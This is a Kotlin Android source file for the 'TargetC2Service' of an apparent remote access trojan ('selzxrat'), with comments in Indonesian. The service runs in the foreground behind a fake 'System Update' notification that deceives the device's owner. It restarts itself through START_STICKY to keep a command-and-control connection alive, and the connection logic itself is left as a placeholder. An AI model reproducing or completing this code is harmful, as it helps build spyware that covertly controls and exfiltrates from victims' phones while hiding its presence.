package com.selzxrat.v5.services

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.selzxrat.v5.R // Pastikan R mengarah ke package aplikasi Anda

class TargetC2Service : Service() {

    private val CHANNEL_ID = "C2ServiceChannel"

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        // Jalankan sebagai foreground service agar tidak dibunuh sistem
        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Update")
            .setContentText("Syncing data...")
            .setSmallIcon(R.drawable.ic_launcher_foreground) // Pastikan icon ini ada
            .build()
        startForeground(1, notification)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d("TargetC2Service", "Service started - Maintaining C2 Connection")
        
        // --- LOGIKA KONEKSI C2 ANDA DI SINI ---
        // Contoh: jalankan Thread atau Coroutine untuk koneksi socket/HTTP
        
        return START_STICKY // Agar service restart otomatis jika dibunuh sistem
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(
                CHANNEL_ID,
                "C2 Service Channel",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(serviceChannel)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
